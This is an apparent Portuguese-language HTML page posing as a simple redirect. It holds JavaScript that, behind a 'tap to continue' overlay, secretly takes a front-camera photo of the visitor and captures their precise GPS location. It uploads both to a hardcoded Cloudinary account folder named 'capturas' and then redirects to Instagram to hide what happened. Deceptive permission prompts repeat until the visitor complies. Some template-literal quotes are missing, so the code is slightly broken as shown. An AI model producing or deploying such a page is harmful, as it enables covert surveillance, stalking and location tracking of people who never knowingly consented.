<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionamento</title> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      text-align: center;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar...</div>
  <script>
    const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
    const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
    const folderName = "capturas";       // Pasta de destino no Cloudinary

    // Função para exibir o overlay com uma mensagem e executa callback ao toque.
    function showOverlay(message, callback) {
      const overlay = document.getElementById("overlay");
      overlay.textContent = message;
      overlay.style.display = "flex";
      overlay.onclick = () => {
        overlay.style.display = "none";
        if (callback) callback();
      };
    }

    // Captura a foto usando a câmera frontal.
    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        const video = document.createElement("video");
        video.playsInline = true;  // Essencial para iOS
        video.muted = true;
        video.srcObject = stream;
        await video.play();

        // Aguarda um breve período para garantir que o vídeo renderizou.
        await new Promise(r => setTimeout(r, 200));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();

        const formData = new FormData();
        formData.append("file", imageBlob);
        formData.append("upload_preset", uploadPreset);
        formData.append("folder", folderName);

        const response = await fetch(https://api.cloudinary.com/v1_1/${cloudName}/image/upload, {
          method: "POST",
          body: formData
        });
        if (!response.ok) throw new Error("Erro ao enviar imagem");
        const data = await response.json();
        return data.secure_url; // Retorna a URL da imagem
      } catch (error) {
        console.error("Erro na captura da foto:", error);
        showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
          // Tenta novamente somente a captura de foto.
          capturePhoto().then(url => requestLocation(url));
        });
        throw error;
      }
    }

    // Solicita a localização e envia o arquivo de texto para o Cloudinary.
    function requestLocation(imageUrl) {
      navigator.geolocation.getCurrentPosition(async (pos) => {
        try {
          const { latitude, longitude } = pos.coords;
          const texto = Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl};
          const textBlob = new Blob([texto], { type: "text/plain" });

          const textForm = new FormData();
          textForm.append("file", textBlob, localizacao_${Date.now()}.txt);
          textForm.append("upload_preset", uploadPreset);
          textForm.append("folder", folderName);

          const textResp = await fetch(https://api.cloudinary.com/v1_1/${cloudName}/raw/upload, {
            method: "POST",
            body: textForm
          });
          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
          // Se tudo ocorrer bem, redireciona para o Instagram.
          window.location.href = "https://instagram.com";
        } catch (err) {
          console.error("Erro no envio da localização:", err);
          showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
            requestLocation(imageUrl);
          });
        }
      }, (err) => {
        console.error("Erro ao obter localização:", err);
        showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
          requestLocation(imageUrl);
        });
      }, {
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      });
    }

    // Função principal que inicia o fluxo: captura a foto e, se bem-sucedida, prossegue para a localização.
    async function startFlow() {
      try {
        const imageUrl = await capturePhoto();
        requestLocation(imageUrl);
      } catch (e) {
        console.error("Erro no fluxo:", e);
      }
    }

    // Inicia o fluxo após o toque inicial (para garantir a interação no iOS).
    document.getElementById("overlay").addEventListener("click", function handler() {
      const overlay = document.getElementById("overlay");
      overlay.style.display = "none"; // Oculta o overlay imediatamente
      overlay.removeEventListener("click", handler);
      startFlow();
    });
  </script>
</body>
</html>
